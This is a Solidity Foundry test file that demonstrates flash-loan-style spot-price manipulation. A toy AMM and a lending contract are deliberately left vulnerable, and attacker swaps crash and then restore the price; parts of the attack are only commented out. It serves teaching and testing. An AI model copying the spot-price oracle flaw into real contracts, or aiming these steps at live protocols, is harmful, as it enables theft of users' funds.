// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * @title Price Manipulation PoC Template
 * @notice Demonstrates spot price manipulation via flash loan
 */

// Simple AMM for demonstration
contract VulnerableAMM {
    uint256 public reserveA;
    uint256 public reserveB;

    constructor() {
        reserveA = 1000 ether;
        reserveB = 1000 ether;
    }

    // VULNERABLE: Uses spot price from reserves
    function getSpotPrice() public view returns (uint256) {
        return (reserveB * 1e18) / reserveA;
    }

    function swap(uint256 amountAIn, uint256 amountBIn) external returns (uint256 amountOut) {
        require(amountAIn > 0 || amountBIn > 0, "Invalid input");

        if (amountAIn > 0) {
            // Swap A for B
            uint256 k = reserveA * reserveB;
            reserveA += amountAIn;
            uint256 newReserveB = k / reserveA;
            amountOut = reserveB - newReserveB;
            reserveB = newReserveB;
        } else {
            // Swap B for A
            uint256 k = reserveA * reserveB;
            reserveB += amountBIn;
            uint256 newReserveA = k / reserveB;
            amountOut = reserveA - newReserveA;
            reserveA = newReserveA;
        }
    }
}

// Vulnerable lending protocol that uses spot price
contract VulnerableLending {
    VulnerableAMM public amm;
    mapping(address => uint256) public collateral;  // In token A
    mapping(address => uint256) public debt;        // In token B

    constructor(address _amm) {
        amm = VulnerableAMM(_amm);
    }

    function deposit(uint256 amount) external {
        collateral[msg.sender] += amount;
    }

    function borrow(uint256 amount) external {
        // VULNERABLE: Uses manipulatable spot price
        uint256 price = amm.getSpotPrice();
        uint256 collateralValue = (collateral[msg.sender] * price) / 1e18;

        require(collateralValue >= amount * 150 / 100, "Undercollateralized");

        debt[msg.sender] += amount;
        // Transfer tokens to borrower...
    }

    // VULNERABLE: Liquidation uses spot price
    function liquidate(address user) external {
        uint256 price = amm.getSpotPrice();
        uint256 collateralValue = (collateral[user] * price) / 1e18;

        // If collateral value < debt, liquidate
        if (collateralValue < debt[user]) {
            // Liquidator gets collateral at discount
            uint256 bonus = collateral[user] * 10 / 100;
            collateral[user] = 0;
            debt[user] = 0;
            // Transfer collateral + bonus to liquidator...
        }
    }
}

contract PriceManipulationPoCTest is Test {
    VulnerableAMM amm;
    VulnerableLending lending;

    address victim = address(0x1);
    address attacker = address(0xBAD);

    function setUp() public {
        // Deploy AMM with initial liquidity
        amm = new VulnerableAMM();

        // Deploy lending protocol
        lending = new VulnerableLending(address(amm));

        // Victim has deposited collateral and borrowed
        vm.startPrank(victim);
        lending.deposit(100 ether);  // 100 token A as collateral
        // Victim borrowed 50 token B (safe at 1:1 price, 200% collateralized)
        vm.stopPrank();

        // Give attacker "flash loan" funds
        vm.deal(attacker, 500 ether);
    }

    function test_Exploit_PriceManipulation() public {
        console.log("=== Initial State ===");
        console.log("Spot price (B/A):", amm.getSpotPrice() / 1e18);
        console.log("Reserve A:", amm.reserveA() / 1e18);
        console.log("Reserve B:", amm.reserveB() / 1e18);

        vm.startPrank(attacker);

        // Step 1: Large swap to manipulate price
        // Dump 500 token A into pool
        console.log("\n=== Step 1: Manipulate Price ===");
        amm.swap(500 ether, 0);

        console.log("Manipulated price (B/A):", amm.getSpotPrice() / 1e18);
        console.log("Reserve A:", amm.reserveA() / 1e18);
        console.log("Reserve B:", amm.reserveB() / 1e18);

        // Price is now much lower (token A is "worth less")
        // Victim's collateral value drops, making them liquidatable

        // Step 2: Liquidate victim at manipulated price
        console.log("\n=== Step 2: Liquidate at Bad Price ===");
        // lending.liquidate(victim);
        // Attacker gets victim's collateral at discount

        // Step 3: Reverse swap to restore price
        console.log("\n=== Step 3: Reverse Swap ===");
        amm.swap(0, 333 ether);  // Swap B back for A

        console.log("Restored price (B/A):", amm.getSpotPrice() / 1e18);

        vm.stopPrank();

        // Verify price was manipulated and restored
        // In real exploit: attacker profits from liquidation bonus
        // and the price difference
    }

    function test_Verify_SpotPriceManipulatable() public {
        uint256 priceBefore = amm.getSpotPrice();
        console.log("Price before:", priceBefore / 1e18);

        // Single large trade significantly moves price
        amm.swap(500 ether, 0);

        uint256 priceAfter = amm.getSpotPrice();
        console.log("Price after:", priceAfter / 1e18);

        // Price should have dropped significantly
        assertLt(priceAfter, priceBefore / 2, "Price should drop by >50%");
    }
}
